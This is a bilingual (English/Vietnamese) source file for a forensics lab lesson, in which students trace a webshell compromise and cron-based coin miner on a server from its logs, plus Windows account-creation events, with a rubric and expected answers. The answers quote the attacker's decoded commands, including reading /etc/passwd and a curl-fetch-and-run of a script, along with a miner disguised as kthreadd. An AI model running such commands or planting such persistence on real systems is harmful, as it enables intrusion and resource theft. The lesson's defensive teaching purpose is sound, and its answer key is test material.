/**
 * Lab 14 — Máy bị xâm nhập (soạn 24/11/2026, agent lgz). Output thật: OUT['s14/lab14'] — bộ lab14 (api02, sinh bởi _demo/s14/tao-vu.py) + EVTX công khai (jump01 user-4720/admin-4732, fs01 apt-4720-4698).
 * Đáp số tất định (giờ VN → UTC −7): ffuf 192.0.2.66 22:10:05–22:16 (1240 request, 1235 × 404, /admin 302, /uploads 301, .git/HEAD .env server-status 403), tổng 1291 request của IP;
 * /admin/login 37 × 401 rồi 200 lúc 22:26:47; GET/POST /admin/media/tai-len 22:30:42/22:31:25 (error.log buffered 0000000412); webshell /uploads/2026/11/logo-moi.php — 8 lệnh 22:32:20→22:38:10
 * (id, uname -a, cat /etc/passwd, sudo -n id, curl x.sh + sh, crontab -l, ps | grep kthreadd, rm x.sh) + rm logo-moi.php 23:06:41, kiểm lại 404 23:07:02;
 * sudo www-data "a password is required" 22:34:50; crontab REPLACE 22:35:43; cron www-data kthreadd mỗi phút 22:36:01 → 09:00:01 (625 lần); 0 Accepted, 1 COMMAND trong auth.log.
 * Windows: jump01 2020-07-12 05:12:58Z 4720 hacking-local-acct → Users, 05:14:30 Administrators, 05:14:44 Backup Operators (admmig); fs01 2021-06-01 14:06:34Z/14:08:21Z 4720 WADGUtilityAccount/elie, 14:09:38Z 4698 \Microsoft\SynchronizeTimeZone, Command "adf".
 */
import { lenh, nguon, lienKet, kv } from '../_chung.mjs';

export default {
  title: '14.8 — Lab 14 — A compromised lab machine: find how they got in, what they did, and what they tried to hide|||14.8 — Lab 14 — Máy ảo lab bị xâm nhập: tìm cách chúng vào, chúng đã làm gì, và đã cố giấu gì',
  slug: 'log-14-8-lab',
  type: 'LESSON',
  isFreePreview: true,
  description: 'Bài lab tổng hợp của chương: sáng 22/11, giám sát báo máy chủ api02 dùng 100 % CPU từ đêm qua. Bạn chỉ có log (auth.log, syslog, access/error log của nginx) và ba tệp EVTX công khai của hai máy Windows cùng "công ty". Trả lời 10 câu hỏi điều tra — dò quét bằng ffuf, đoán mật khẩu trang quản trị, tải webshell, chạy lệnh, cài trình đào coin bằng cron dưới www-data, thử sudo thất bại, xoá dấu vết — gắn từng bước vào ATT&CK, viết dòng thời gian UTC và 5 khuyến nghị. Lời giải chạy thật được che, kèm thang chấm.',
  content: `
<div class="ml-en">
<span class="eyebrow">Chapter 14 · Lab 14</span>
<h2>api02 has been at 100 % CPU since last night</h2>
<p class="lead">Monday 22/11/2026, 09:00. Monitoring says the API server <strong>api02</strong> (nginx + PHP admin panel) has been burning 100 % CPU since late last night. Nobody changed anything. You have its logs, and the security team also hands you three Windows event logs from two other machines of the same company. Investigate, map to ATT&amp;CK, write the timeline — in UTC.</p>

${kv([
  ['Time', '90–150 minutes.'],
  ['You need', 'The chapter data (<code>python3 tao-vu.py ~/c14</code> → <code>~/c14/lab14</code>) and the Windows samples of Lesson 4.9 (user-4720, admin-4732, apt-4720-4698) + evtx-rec / Get-WinEvent.'],
  ['You practise', 'Shapes of guessing (14.1), first-seen and odd hours (14.2), persistence (14.3), hiding (14.4), timeline (14.5), ATT&CK (14.6).'],
  ['Deliverable', 'Answers to the 10 questions, a 10–15 row UTC timeline with evidence, ATT&CK IDs, 5 recommendations.'],
])}
<pre><code class="language-bash">cd ~/c14/lab14 &amp;&amp; cat DE-BAI.txt &amp;&amp; find . -type f | xargs wc -l</code></pre>

<h3>The questions</h3>
<ol>
<li>What is using the CPU, under which account, since when, how often? (syslog)</li>
<li>Which IP started it all, what did it do between 22:10 and 22:17 local time, with which tool, and what did it learn? (access.log)</li>
<li>How did it get into <code>/admin</code>? Which ATT&amp;CK sub-technique — and why is it <em>not</em> spraying?</li>
<li>What was uploaded, when, and which two logs prove it?</li>
<li>List, in UTC order, every command run through the uploaded file (decode the URL).</li>
<li>Did the attacker become root? Prove it either way (auth.log).</li>
<li>How does the miner survive a reboot? What names/paths are camouflage?</li>
<li>What did they try to hide, and what could they <em>not</em> hide — why?</li>
<li>Windows: what happened on jump01 and on fs01? Times in UTC, accounts, events, ATT&amp;CK.</li>
<li>Write the timeline (UTC, source, event, evidence, confidence) and five concrete recommendations.</li>
</ol>
<div class="pitfall co-tieu-de"><p><strong>Time zone trap.</strong> api02's logs are local time (+07:00 / +0700); EVTX is UTC. Your report must be in UTC: 22:36 local = 15:36Z.</p></div>

<h3>Rubric (100 points)</h3>
${kv([
  ['Q1–Q2 (15)', 'Cron line, account, first/last time, 625 runs; ffuf, 1 240 requests, what returned non-404.'],
  ['Q3–Q4 (15)', '37 failures then success on one account = T1110.001; upload POST + error.log line.'],
  ['Q5–Q6 (15)', '8 + 1 decoded commands with times; sudo refused, no SSH logon → still www-data.'],
  ['Q7–Q8 (15)', 'crontab REPLACE + per-minute CMD; kthreadd in /var/tmp/.cache; deleted x.sh and the webshell (404 afterwards); logs not writable by www-data.'],
  ['Q9 (10)', 'Both Windows stories with correct UTC times and IDs.'],
  ['Q10 (30)', 'Timeline correct and in UTC with evidence; ATT&CK IDs current (v19.2); recommendations specific to what happened.'],
])}

<h3>Answers (try first!)</h3>
<details>
<summary><strong>Show the commands and real output</strong></summary>
${lenh('s14/lab14', 0)}
${lenh('s14/lab14', 1)}
${lenh('s14/lab14', 2)}
${lenh('s14/lab14', 3)}
${lenh('s14/lab14', 4)}
${lenh('s14/lab14', 5)}
${lenh('s14/lab14', 6)}
${lenh('s14/lab14', 7)}
${lenh('s14/lab14', 8)}
${lenh('s14/lab14', 9)}
${lenh('s14/lab14', 10)}
${lenh('s14/lab14', 11)}
${lenh('s14/lab14', 12)}
${lenh('s14/lab14', 13)}
${lenh('s14/lab14', 14)}
</details>
<details>
<summary><strong>Show the expected answers</strong></summary>
<ol>
<li><code>/var/tmp/.cache/kthreadd -c …/c.json</code> run by cron as <strong>www-data</strong> every minute from 15:36:01Z (22:36 local) to 02:00:01Z — 625 runs. A miner (T1496.001).</li>
<li>192.0.2.66, <strong>ffuf</strong> (its User-Agent): 1 240 requests at ~3.4/s from 15:10:05Z; 1 235 × 404; learned <code>/admin</code> (302), <code>/uploads</code> (301), and that <code>.git/HEAD</code>, <code>.env</code>, <code>server-status</code> exist but are forbidden (403) — T1595.003 Wordlist Scanning.</li>
<li>37 × 401 on <code>POST /admin/login</code> from one IP to one form, then 200 at 15:26:47Z — password guessing on one account (T1110.001), depth not width; the normal admin logs in from 10.0.7.12 at 09:0x.</li>
<li><code>POST /admin/media/tai-len</code> at 15:31:25Z (access.log) + nginx error.log "client request body is buffered to a temporary file" at the same second; then requests to <code>/uploads/2026/11/logo-moi.php</code> — a PHP webshell (T1505.003). Root cause: the media uploader accepts and the web server executes .php (T1190 class of weakness).</li>
<li>15:32:20Z id · 15:33:10Z uname -a · 15:34:00Z cat /etc/passwd · 15:34:50Z sudo -n id · 15:35:40Z cd /var/tmp &amp;&amp; curl … x.sh &amp;&amp; sh x.sh · 15:36:30Z crontab -l · 15:37:20Z ps aux | grep kthreadd · 15:38:10Z rm -f /var/tmp/x.sh · 16:06:41Z rm -f logo-moi.php (T1059.004, T1082, T1033, T1105, T1070.004).</li>
<li>No: auth.log has exactly one sudo line — "www-data : a password is required … COMMAND=/usr/bin/id" at 15:34:50Z — and no Accepted SSH logon. Everything ran as www-data.</li>
<li>www-data's crontab (syslog "crontab[…]: (www-data) REPLACE (www-data)" at 15:35:43Z, 3 s after x.sh ran) — T1053.003. Camouflage: the kernel-thread name <code>kthreadd</code> in a hidden directory <code>/var/tmp/.cache</code> (T1036.005).</li>
<li>Hid: x.sh deleted, the webshell deleted (their own check at 16:07:02Z returns 404 and error.log records "No such file"). Could not hide: www-data cannot write <code>/var/log</code>, so every request, the sudo attempt and every cron run are intact. Still on disk: the crontab and <code>/var/tmp/.cache</code>.</li>
<li>jump01 (12/7/2020): admmig creates <code>hacking-local-acct</code> at 05:12:58Z (4720 → automatic 4732 Users), adds it to Administrators 05:14:30Z and Backup Operators 05:14:44Z — T1136.001 + T1098. fs01 (1/6/2021): admmig creates WADGUtilityAccount 14:06:34Z and elie 14:08:21Z, then a scheduled task <code>\\Microsoft\\SynchronizeTimeZone</code> at 14:09:38Z whose command is "adf" (4698; T1053.005, masquerading in the \\Microsoft\\ folder).</li>
<li>Recommendations (examples): rate-limit + lockout + MFA on <code>/admin</code> and restrict it to the office IP/VPN; upload allow-list of image types and <strong>no PHP execution</strong> in /uploads; mount /var/tmp noexec and restrict cron with <code>/etc/cron.allow</code>; alert on any crontab change for service accounts and on ffuf/scanner bursts; ship logs centrally with a silence alert (14.4). Then: remove the crontab and /var/tmp/.cache, rotate the admin password, review what else that admin account could do.</li>
</ol>
</details>

<h3>At work</h3>
<p>This is a typical "small" incident on an outsourced project: no root, no data theft visible — but the admin password and the upload feature are broken, and the customer's server mined coins for 10 hours on their bill. Your report should say exactly that, with evidence, without exaggerating or minimising.</p>
${lienKet({ khoa: 'log-tu-a-den-z', bai: 'log-10-9-tan-cong-web', title: 'Lesson 10.9 — Web attacks in access logs', sub: 'Scanners, injection, webshells in nginx/Apache', cta: 'Open' })}
${lienKet({ khoa: 'blue-team-siem', bai: 'siem-6-3-web-shell', title: 'Blue Team course › 6.3 Web attacks: scans, injection, web shells', sub: 'Turning them into rules', cta: 'Open' })}
</div>
<div class="ml-vi">
<span class="eyebrow">Chương 14 · Lab 14</span>
<h2>api02 chạy 100 % CPU từ đêm qua</h2>
<p class="lead">Thứ Hai 22/11/2026, 09:00. Giám sát báo máy chủ API <strong>api02</strong> (nginx + trang quản trị viết bằng PHP) đã ngốn 100 % CPU từ khuya hôm qua. Không ai thay đổi gì. Bạn có log của nó, và đội bảo mật đưa thêm ba tệp log sự kiện Windows của hai máy khác trong cùng công ty. Điều tra, gắn ATT&amp;CK, viết dòng thời gian — theo UTC.</p>

${kv([
  ['Thời gian', '90–150 phút.'],
  ['Cần có', 'Dữ liệu của chương (<code>python3 tao-vu.py ~/c14</code> → <code>~/c14/lab14</code>) và các mẫu Windows của Bài 4.9 (user-4720, admin-4732, apt-4720-4698) + evtx-rec / Get-WinEvent.'],
  ['Luyện', 'Hình dạng đoán mật khẩu (14.1), lần đầu thấy và giờ lạ (14.2), bám trụ (14.3), che giấu (14.4), dòng thời gian (14.5), ATT&CK (14.6).'],
  ['Nộp', 'Trả lời 10 câu hỏi, dòng thời gian 10–15 hàng theo UTC kèm bằng chứng, mã ATT&CK, 5 khuyến nghị.'],
])}
<pre><code class="language-bash">cd ~/c14/lab14 &amp;&amp; cat DE-BAI.txt &amp;&amp; find . -type f | xargs wc -l</code></pre>

<h3>Các câu hỏi</h3>
<ol>
<li>Cái gì đang dùng CPU, dưới tài khoản nào, từ lúc nào, bao lâu một lần? (syslog)</li>
<li>IP nào khởi đầu mọi chuyện, nó làm gì từ 22:10 tới 22:17 giờ VN, bằng công cụ gì, và học được gì? (access.log)</li>
<li>Nó vào <code>/admin</code> bằng cách nào? Kỹ thuật con ATT&amp;CK nào — và vì sao đây <em>không</em> phải spraying?</li>
<li>Thứ gì được tải lên, lúc nào, và hai log nào chứng minh?</li>
<li>Liệt kê theo thứ tự UTC mọi lệnh đã chạy qua tệp được tải lên (giải mã URL).</li>
<li>Kẻ tấn công có lên được root không? Chứng minh (auth.log).</li>
<li>Trình đào coin sống sót qua khởi động lại bằng cách nào? Tên/đường dẫn nào là nguỵ trang?</li>
<li>Họ đã cố giấu gì, và cái gì họ <em>không</em> giấu được — vì sao?</li>
<li>Windows: chuyện gì xảy ra trên jump01 và fs01? Giờ UTC, tài khoản, sự kiện, ATT&amp;CK.</li>
<li>Viết dòng thời gian (UTC, nguồn, sự kiện, bằng chứng, độ tin cậy) và năm khuyến nghị cụ thể.</li>
</ol>
<div class="pitfall co-tieu-de"><p><strong>Bẫy múi giờ.</strong> Log của api02 theo giờ địa phương (+07:00 / +0700); EVTX theo UTC. Báo cáo phải theo UTC: 22:36 giờ VN = 15:36Z.</p></div>

<h3>Thang chấm (100 điểm)</h3>
${kv([
  ['Câu 1–2 (15)', 'Dòng cron, tài khoản, lần đầu/lần cuối, 625 lần; ffuf, 1 240 request, cái gì trả về khác 404.'],
  ['Câu 3–4 (15)', '37 lần hỏng rồi thành công trên một tài khoản = T1110.001; POST tải lên + dòng error.log.'],
  ['Câu 5–6 (15)', '8 + 1 lệnh đã giải mã kèm giờ; sudo bị từ chối, không có đăng nhập SSH → vẫn là www-data.'],
  ['Câu 7–8 (15)', 'crontab REPLACE + CMD mỗi phút; kthreadd trong /var/tmp/.cache; đã xoá x.sh và webshell (404 sau đó); www-data không ghi được log.'],
  ['Câu 9 (10)', 'Cả hai câu chuyện Windows với giờ UTC và mã đúng.'],
  ['Câu 10 (30)', 'Dòng thời gian đúng, theo UTC, có bằng chứng; mã ATT&CK theo bản hiện hành (v19.2); khuyến nghị bám đúng chuyện đã xảy ra.'],
])}

<h3>Lời giải (làm trước đã!)</h3>
<details>
<summary><strong>Hiện lệnh và output thật</strong></summary>
${lenh('s14/lab14', 0)}
${lenh('s14/lab14', 1)}
${lenh('s14/lab14', 2)}
${lenh('s14/lab14', 3)}
${lenh('s14/lab14', 4)}
${lenh('s14/lab14', 5)}
${lenh('s14/lab14', 6)}
${lenh('s14/lab14', 7)}
${lenh('s14/lab14', 8)}
${lenh('s14/lab14', 9)}
${lenh('s14/lab14', 10)}
${lenh('s14/lab14', 11)}
${lenh('s14/lab14', 12)}
${lenh('s14/lab14', 13)}
${lenh('s14/lab14', 14)}
</details>
<details>
<summary><strong>Hiện đáp án mong đợi</strong></summary>
<ol>
<li><code>/var/tmp/.cache/kthreadd -c …/c.json</code> do cron chạy dưới <strong>www-data</strong> mỗi phút từ 15:36:01Z (22:36 giờ VN) tới 02:00:01Z — 625 lần. Một trình đào coin (T1496.001).</li>
<li>192.0.2.66, <strong>ffuf</strong> (User-Agent của nó): 1 240 request, ~3,4 request/giây từ 15:10:05Z; 1 235 × 404; học được <code>/admin</code> (302), <code>/uploads</code> (301), và biết <code>.git/HEAD</code>, <code>.env</code>, <code>server-status</code> có tồn tại nhưng bị cấm (403) — T1595.003 Wordlist Scanning.</li>
<li>37 × 401 trên <code>POST /admin/login</code> từ một IP vào một biểu mẫu, rồi 200 lúc 15:26:47Z — đoán mật khẩu một tài khoản (T1110.001), sâu chứ không rộng; quản trị viên thật đăng nhập từ 10.0.7.12 khoảng 09:0x.</li>
<li><code>POST /admin/media/tai-len</code> lúc 15:31:25Z (access.log) + error.log của nginx "client request body is buffered to a temporary file" cùng giây; sau đó là các request tới <code>/uploads/2026/11/logo-moi.php</code> — webshell PHP (T1505.003). Nguyên nhân gốc: chức năng tải ảnh nhận tệp .php và máy chủ web thực thi nó (lớp lỗi T1190).</li>
<li>15:32:20Z id · 15:33:10Z uname -a · 15:34:00Z cat /etc/passwd · 15:34:50Z sudo -n id · 15:35:40Z cd /var/tmp &amp;&amp; curl … x.sh &amp;&amp; sh x.sh · 15:36:30Z crontab -l · 15:37:20Z ps aux | grep kthreadd · 15:38:10Z rm -f /var/tmp/x.sh · 16:06:41Z rm -f logo-moi.php (T1059.004, T1082, T1033, T1105, T1070.004).</li>
<li>Không: auth.log có đúng một dòng sudo — "www-data : a password is required … COMMAND=/usr/bin/id" lúc 15:34:50Z — và không có lần đăng nhập SSH Accepted nào. Mọi thứ chạy dưới www-data.</li>
<li>crontab của www-data (syslog "crontab[…]: (www-data) REPLACE (www-data)" lúc 15:35:43Z, 3 giây sau khi x.sh chạy) — T1053.003. Nguỵ trang: tên luồng nhân <code>kthreadd</code> trong thư mục ẩn <code>/var/tmp/.cache</code> (T1036.005).</li>
<li>Đã giấu: xoá x.sh, xoá webshell (chính lần kiểm lại của họ lúc 16:07:02Z nhận 404 và error.log ghi "No such file"). Không giấu được: www-data không ghi được <code>/var/log</code>, nên mọi request, lần thử sudo và mọi lần cron chạy còn nguyên. Vẫn còn trên đĩa: crontab và <code>/var/tmp/.cache</code>.</li>
<li>jump01 (12/7/2020): admmig tạo <code>hacking-local-acct</code> lúc 05:12:58Z (4720 → 4732 Users tự động), thêm vào Administrators 05:14:30Z và Backup Operators 05:14:44Z — T1136.001 + T1098. fs01 (1/6/2021): admmig tạo WADGUtilityAccount 14:06:34Z và elie 14:08:21Z, rồi tác vụ hẹn giờ <code>\\Microsoft\\SynchronizeTimeZone</code> lúc 14:09:38Z với lệnh "adf" (4698; T1053.005, nguỵ trang trong thư mục \\Microsoft\\).</li>
<li>Khuyến nghị (ví dụ): giới hạn tốc độ + khoá + MFA cho <code>/admin</code> và chỉ cho IP văn phòng/VPN vào; tải lên chỉ nhận danh sách định dạng ảnh và <strong>không thực thi PHP</strong> trong /uploads; gắn /var/tmp với noexec và giới hạn cron bằng <code>/etc/cron.allow</code>; cảnh báo mọi thay đổi crontab của tài khoản dịch vụ và các đợt dò quét kiểu ffuf; gửi log về trung tâm kèm cảnh báo im lặng (14.4). Rồi: gỡ crontab và /var/tmp/.cache, đổi mật khẩu admin, rà xem tài khoản admin đó còn làm được gì.</li>
</ol>
</details>

<h3>Đi làm thật (outsourcing / OJT)</h3>
<p>Đây là một sự cố "nhỏ" điển hình ở dự án outsourcing: không lên được root, không thấy dữ liệu bị lấy — nhưng mật khẩu admin và chức năng tải lên đều hỏng, và máy chủ của khách đã đào coin 10 tiếng bằng tiền điện của họ. Báo cáo của bạn phải nói đúng như vậy, có bằng chứng, không thổi phồng cũng không giảm nhẹ.</p>
${lienKet({ khoa: 'log-tu-a-den-z', bai: 'log-10-9-tan-cong-web', title: 'Bài 10.9 — Tấn công web trong access log', sub: 'Máy dò, injection, webshell trong nginx/Apache', cta: 'Mở bài' })}
${lienKet({ khoa: 'blue-team-siem', bai: 'siem-6-3-web-shell', title: 'Khoá Blue Team › 6.3 Tấn công web: dò quét, injection, web shell', sub: 'Biến chúng thành quy tắc', cta: 'Mở bài' })}
</div>
`,
};
